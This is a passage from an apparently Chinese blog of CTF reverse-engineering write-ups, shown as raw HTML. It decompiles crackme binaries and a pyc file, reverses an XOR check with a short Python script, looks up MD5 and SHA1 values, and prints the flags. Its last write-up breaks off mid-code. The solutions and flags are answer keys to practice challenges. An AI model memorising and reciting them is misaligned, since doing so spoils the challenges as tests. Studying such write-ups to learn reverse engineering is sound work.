class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;);</span><br><span class="line">  HighTemplar::<span class="hljs-built_in">HighTemplar</span>((DarkTemplar *)&amp;v23, (__int64)&amp;v18);</span><br><span class="line">  v10 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(&amp;std::cout, <span class="hljs-string">"Checking...."</span>);</span><br><span class="line">  std::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v10, &amp;std::endl&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;);</span><br><span class="line">  std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::<span class="hljs-built_in">basic_string</span>(&amp;v19, &amp;v18);</span><br><span class="line">  <span class="hljs-built_in">func1</span>((__int64)&amp;v20, (__int64)&amp;v19);</span><br><span class="line">  <span class="hljs-built_in">func2</span>((__int64)&amp;v21, (__int64)&amp;v20);</span><br><span class="line">  <span class="hljs-built_in">func3</span>((__int64)&amp;v21, <span class="hljs-number">0</span>);</span><br><span class="line">  std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::~<span class="hljs-built_in">basic_string</span>(&amp;v21);</span><br><span class="line">  std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::~<span class="hljs-built_in">basic_string</span>(&amp;v20);</span><br><span class="line">  std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::~<span class="hljs-built_in">basic_string</span>(&amp;v19);</span><br><span class="line">  HighTemplar::<span class="hljs-built_in">calculate</span>((HighTemplar *)&amp;v23);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)HighTemplar::<span class="hljs-built_in">getSerial</span>((HighTemplar *)&amp;v23) == <span class="hljs-number">0</span> )</span><br><span class="line">  {</span><br><span class="line">    v11 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(&amp;std::cout, <span class="hljs-string">"/////////////////////////////////"</span>);</span><br><span class="line">    std::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v11, &amp;std::endl&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;);</span><br><span class="line">    v12 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(&amp;std::cout, <span class="hljs-string">"Do not be angry. Happy Hacking :)"</span>);</span><br><span class="line">    std::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v12, &amp;std::endl&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;);</span><br><span class="line">    v13 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(&amp;std::cout, <span class="hljs-string">"/////////////////////////////////"</span>);</span><br><span class="line">    std::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v13, &amp;std::endl&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;);</span><br><span class="line">    <span class="hljs-built_in">ZN11HighTemplar7getFlagB5cxx11Ev</span>((__int64)&amp;v22, (__int64)&amp;v23);</span><br><span class="line">    v14 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(&amp;std::cout, <span class="hljs-string">"flag{"</span>);</span><br><span class="line">    v15 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;(v14, &amp;v22);</span><br><span class="line">    v16 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(v15, <span class="hljs-string">"}"</span>);</span><br><span class="line">    std::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v16, &amp;std::endl&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;);</span><br><span class="line">    std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::~<span class="hljs-built_in">basic_string</span>(&amp;v22);</span><br><span class="line">  }</span><br><span class="line">  HighTemplar::~<span class="hljs-built_in">HighTemplar</span>((HighTemplar *)&amp;v23);</span><br><span class="line">  std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::~<span class="hljs-built_in">basic_string</span>(&amp;v18);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>乍一看很复杂，慢慢分析，发现了一个输入，被赋值给了<code>v18</code>，然后发现一个类的构造函数调用了我们输入的字符串，可以理解为，用我们的字符串初始化了类中的数据成员，进去仔细看看</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">nsigned __int64 __fastcall <span class="hljs-title">HighTemplar::HighTemplar</span><span class="hljs-params">(DarkTemplar *a1, __int64 a2)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">char</span> v3; <span class="hljs-comment">// [rsp+17h] [rbp-19h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);</span><br><span class="line">  DarkTemplar::<span class="hljs-built_in">DarkTemplar</span>(a1);</span><br><span class="line">  *(_QWORD *)a1 = &amp;off_401EA0;</span><br><span class="line">  *((_DWORD *)a1 + <span class="hljs-number">3</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">  std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::<span class="hljs-built_in">basic_string</span>((<span class="hljs-keyword">char</span> *)a1 + <span class="hljs-number">16</span>, a2);</span><br><span class="line">  std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::<span class="hljs-built_in">basic_string</span>((<span class="hljs-keyword">char</span> *)a1 + <span class="hljs-number">48</span>, a2);</span><br><span class="line">  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::<span class="hljs-built_in">allocator</span>(&amp;v3, a2);</span><br><span class="line">  std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::<span class="hljs-built_in">basic_string</span>(</span><br><span class="line">    (<span class="hljs-keyword">char</span> *)a1 + <span class="hljs-number">80</span>,</span><br><span class="line">    <span class="hljs-string">"327a6c4304ad5938eaf0efb6cc3e53dc"</span>,</span><br><span class="line">    &amp;v3);</span><br><span class="line">  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::~<span class="hljs-built_in">allocator</span>(&amp;v3);</span><br><span class="line">  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>从这里看，类里面至少应该有一个<code>getSerial()</code>函数在<code>off_401EA0</code>处，三个字符串，偏移量分别为16，48，80，长度都是32位，还有一个布尔型变量，偏移量位3，并且我们还知道，我们的数据被传入了一个变量<code>v23</code>里，然后返回去，跟踪<code>v23</code>，找到剩下的关键函数</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">bool</span> __fastcall <span class="hljs-title">HighTemplar::calculate</span><span class="hljs-params">(HighTemplar *<span class="hljs-keyword">this</span>)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  __int64 v1; <span class="hljs-comment">// rax</span></span><br><span class="line">  _BYTE *v2; <span class="hljs-comment">// rbx</span></span><br><span class="line">  <span class="hljs-keyword">bool</span> result; <span class="hljs-comment">// al</span></span><br><span class="line">  _BYTE *v4; <span class="hljs-comment">// rbx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> j; <span class="hljs-comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> ( std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::<span class="hljs-built_in">length</span>((<span class="hljs-keyword">char</span> *)<span class="hljs-keyword">this</span> + <span class="hljs-number">16</span>) != <span class="hljs-number">32</span> )</span><br><span class="line">  {</span><br><span class="line">    v1 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(&amp;std::cout, <span class="hljs-string">"Too short or too long"</span>);</span><br><span class="line">    std::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;);</span><br><span class="line">    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>;</span><br><span class="line">        i &lt;= (<span class="hljs-keyword">unsigned</span> __int64)std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::<span class="hljs-built_in">length</span>((<span class="hljs-keyword">char</span> *)<span class="hljs-keyword">this</span> + <span class="hljs-number">16</span>);</span><br><span class="line">        ++i )</span><br><span class="line">  {</span><br><span class="line">    v2 = (_BYTE *)std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::<span class="hljs-keyword">operator</span>[](</span><br><span class="line">                    (<span class="hljs-keyword">char</span> *)<span class="hljs-keyword">this</span> + <span class="hljs-number">16</span>,</span><br><span class="line">                    i);</span><br><span class="line">    *v2 = (*(_BYTE *)std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::<span class="hljs-keyword">operator</span>[](</span><br><span class="line">                       (<span class="hljs-keyword">char</span> *)<span class="hljs-keyword">this</span> + <span class="hljs-number">16</span>,</span><br><span class="line">                       i) ^ <span class="hljs-number">0x50</span>)</span><br><span class="line">        + <span class="hljs-number">23</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; ; ++j )</span><br><span class="line">  {</span><br><span class="line">    result = j &lt;= (<span class="hljs-keyword">unsigned</span> __int64)std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::<span class="hljs-built_in">length</span>((<span class="hljs-keyword">char</span> *)<span class="hljs-keyword">this</span> + <span class="hljs-number">16</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span> ( !result )</span><br><span class="line">      <span class="hljs-keyword">break</span>;</span><br><span class="line">    v4 = (_BYTE *)std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::<span class="hljs-keyword">operator</span>[](</span><br><span class="line">                    (<span class="hljs-keyword">char</span> *)<span class="hljs-keyword">this</span> + <span class="hljs-number">16</span>,</span><br><span class="line">                    j);</span><br><span class="line">    *v4 = (*(_BYTE *)std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::<span class="hljs-keyword">operator</span>[](</span><br><span class="line">                       (<span class="hljs-keyword">char</span> *)<span class="hljs-keyword">this</span> + <span class="hljs-number">16</span>,</span><br><span class="line">                       j) ^ <span class="hljs-number">0x13</span>)</span><br><span class="line">        + <span class="hljs-number">11</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这一看就是个加密函数，并且只对偏移量位16处的字符串进行了操作，这里正好是我们输入的字符串，虽然有两个for循环，但是都是对同一个字符串的同一个位置进行操作，很好逆向，加密完之后应该还会有一个验证，找到下面的验证函数</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">HighTemplar::getSerial</span><span class="hljs-params">(HighTemplar *<span class="hljs-keyword">this</span>)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  __int64 v1; <span class="hljs-comment">// rbx</span></span><br><span class="line">  __int64 v2; <span class="hljs-comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="hljs-comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="hljs-comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="hljs-comment">// rax</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>;</span><br><span class="line">        (<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)i &lt; (<span class="hljs-keyword">unsigned</span> __int64)std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::<span class="hljs-built_in">length</span>((<span class="hljs-keyword">char</span> *)<span class="hljs-keyword">this</span> + <span class="hljs-number">16</span>);</span><br><span class="line">        ++i )</span><br><span class="line">  {</span><br><span class="line">    v1 = *(<span class="hljs-keyword">unsigned</span> __int8 *)std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::<span class="hljs-keyword">operator</span>[](</span><br><span class="line">                               (<span class="hljs-keyword">char</span> *)<span class="hljs-keyword">this</span> + <span class="hljs-number">80</span>,</span><br><span class="line">                               (<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)i);</span><br><span class="line">    <span class="hljs-keyword">if</span> ( (_BYTE)v1 != *(_BYTE *)std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::<span class="hljs-keyword">operator</span>[](</span><br><span class="line">                                  (<span class="hljs-keyword">char</span> *)<span class="hljs-keyword">this</span> + <span class="hljs-number">16</span>,</span><br><span class="line">                                  (<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)i) )</span><br><span class="line">    {</span><br><span class="line">      v4 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(&amp;std::cout, <span class="hljs-string">"You did not pass "</span>);</span><br><span class="line">      v5 = std::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v4, i);</span><br><span class="line">      std::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v5, &amp;std::endl&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;);</span><br><span class="line">      *((_DWORD *)<span class="hljs-keyword">this</span> + <span class="hljs-number">3</span>) = <span class="hljs-number">1</span>;</span><br><span class="line">      <span class="hljs-keyword">return</span> *((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)<span class="hljs-keyword">this</span> + <span class="hljs-number">3</span>);</span><br><span class="line">    }</span><br><span class="line">    v2 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(&amp;std::cout, <span class="hljs-string">"Pass "</span>);</span><br><span class="line">    v3 = std::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v2, i);</span><br><span class="line">    std::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v3, &amp;std::endl&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> *((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)<span class="hljs-keyword">this</span> + <span class="hljs-number">3</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这个函数不长，很简单的验证了加密过后的字符串和偏移量位80的字符串是不是一样，用偏移量位3处的布尔值作为返回值，如果相同返回0，回到主函数，接下来就成功了，没有其他的变换和判断，所以这个程序实际上非常简单</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">target = <span class="hljs-string">"327a6c4304ad5938eaf0efb6cc3e53dc"</span></span><br><span class="line">flag = <span class="hljs-string">''</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> target:</span><br><span class="line">    flag += <span class="hljs-built_in">chr</span>((((<span class="hljs-built_in">ord</span>(i) - <span class="hljs-number">11</span>) ^ <span class="hljs-number">0x13</span>) - <span class="hljs-number">23</span>) ^ <span class="hljs-number">0x50</span>)</span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><p>很简单就可以逆向出，套上<code>flag{}</code>提交即可（这个flag长得实在不像是正确的）</p><figure class="highlight dust hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-xml">flag</span><span class="hljs-template-variable">{tMx~qdstOs~crvtwb~aOba}</span><span class="hljs-xml">qddtbrtcd}</span></span><br></pre></td></tr></tbody></table></figure><h4 id="re4-unvm-me"><a href="#re4-unvm-me" class="headerlink" title="re4-unvm-me"></a>re4-unvm-me</h4><p>pyc格式，直接uncompyle6反编译，成功，没有对pyc文件动什么手脚，反编译后的源代码如下</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> md5</span><br><span class="line">md5s = [</span><br><span class="line"> <span class="hljs-number">174282896860968005525213562254350376167</span>, <span class="hljs-number">137092044126081477479435678296496849608</span>, <span class="hljs-number">126300127609096051658061491018211963916</span>, <span class="hljs-number">314989972419727999226545215739316729360</span>, <span class="hljs-number">256525866025901597224592941642385934114</span>, <span class="hljs-number">115141138810151571209618282728408211053</span>, <span class="hljs-number">8705973470942652577929336993839061582</span>, <span class="hljs-number">256697681645515528548061291580728800189</span>, <span class="hljs-number">39818552652170274340851144295913091599</span>, <span class="hljs-number">65313561977812018046200997898904313350</span>, <span class="hljs-number">230909080238053318105407334248228870753</span>, <span class="hljs-number">196125799557195268866757688147870815374</span>, <span class="hljs-number">74874145132345503095307276614727915885</span>]</span><br><span class="line"><span class="hljs-built_in">print</span> <span class="hljs-string">'Can you turn me back to python ? ...'</span></span><br><span class="line">flag = raw_input(<span class="hljs-string">'well as you wish.. what is the flag: '</span>)</span><br><span class="line"><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(flag) &gt; <span class="hljs-number">69</span>:</span><br><span class="line">    <span class="hljs-built_in">print</span> <span class="hljs-string">'nice try'</span></span><br><span class="line">    exit()</span><br><span class="line"><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(flag) % <span class="hljs-number">5</span> != <span class="hljs-number">0</span>:</span><br><span class="line">    <span class="hljs-built_in">print</span> <span class="hljs-string">'nice try'</span></span><br><span class="line">    exit()</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(flag), <span class="hljs-number">5</span>):</span><br><span class="line">    s = flag[i:i + <span class="hljs-number">5</span>]</span><br><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(<span class="hljs-string">'0x'</span> + md5.new(s).hexdigest(), <span class="hljs-number">16</span>) != md5s[(i / <span class="hljs-number">5</span>)]:</span><br><span class="line">        <span class="hljs-built_in">print</span> <span class="hljs-string">'nice try'</span></span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">print</span> <span class="hljs-string">'Congratz now you have the flag'</span></span><br></pre></td></tr></tbody></table></figure><p>发现给出了很多md5，把flag每5个字符一组，算出md5要和给出的相同，所以用这些<a href="https://www.somd5.com/">md5在线解密</a></p><p>组合起来就是flag</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">ALEXCTF</span>{dv<span class="hljs-number">5</span>d<span class="hljs-number">4</span>s<span class="hljs-number">2</span>vj<span class="hljs-number">8</span>nk<span class="hljs-number">43</span>s<span class="hljs-number">8</span>d<span class="hljs-number">8</span>l<span class="hljs-number">6</span>m<span class="hljs-number">1</span>n<span class="hljs-number">5</span>l<span class="hljs-number">67</span>ds<span class="hljs-number">9</span>v<span class="hljs-number">41</span>n<span class="hljs-number">52</span>nv<span class="hljs-number">37</span>j<span class="hljs-number">481</span>h<span class="hljs-number">3</span>d<span class="hljs-number">28</span>n<span class="hljs-number">4</span>b<span class="hljs-number">6</span>v<span class="hljs-number">3</span>k}</span><br></pre></td></tr></tbody></table></figure><h4 id="anser-to-everything"><a href="#anser-to-everything" class="headerlink" title="anser_to_everything"></a>anser_to_everything</h4><p>IDA打开</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Gimme: "</span>, argv, envp);</span><br><span class="line">  __isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;v4);</span><br><span class="line">  <span class="hljs-built_in">not_the_flag</span>(v4);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//not_the_flag</span></span><br><span class="line"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">not_the_flag</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">if</span> ( a1 == <span class="hljs-string">'*'</span> )</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Cipher from Bill \nSubmit without any tags\n#kdudpeh"</span>);</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"YOUSUCK"</span>);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>找到了一个字符串<code>kdudpeh</code>，根据题目提示，sha1加密得<code>80ee2a3fe31da904c596d993f7f1de4827c1450a</code></p><p>套上flag得</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">flag</span>{<span class="hljs-number">80</span>ee<span class="hljs-number">2</span>a<span class="hljs-number">3</span>fe<span class="hljs-number">31</span>da<span class="hljs-number">904</span>c<span class="hljs-number">596</span>d<span class="hljs-number">993</span>f<span class="hljs-number">7</span>f<span class="hljs-number">1</span>de<span class="hljs-number">4827</span>c<span class="hljs-number">1450</span>a}</span><br></pre></td></tr></tbody></table></figure><h4 id="elrond32"><a href="#elrond32" class="headerlink" title="elrond32"></a>elrond32</h4><p>IDA打开，main函数如下</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1, <span class="hljs-keyword">char</span> **a2)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span 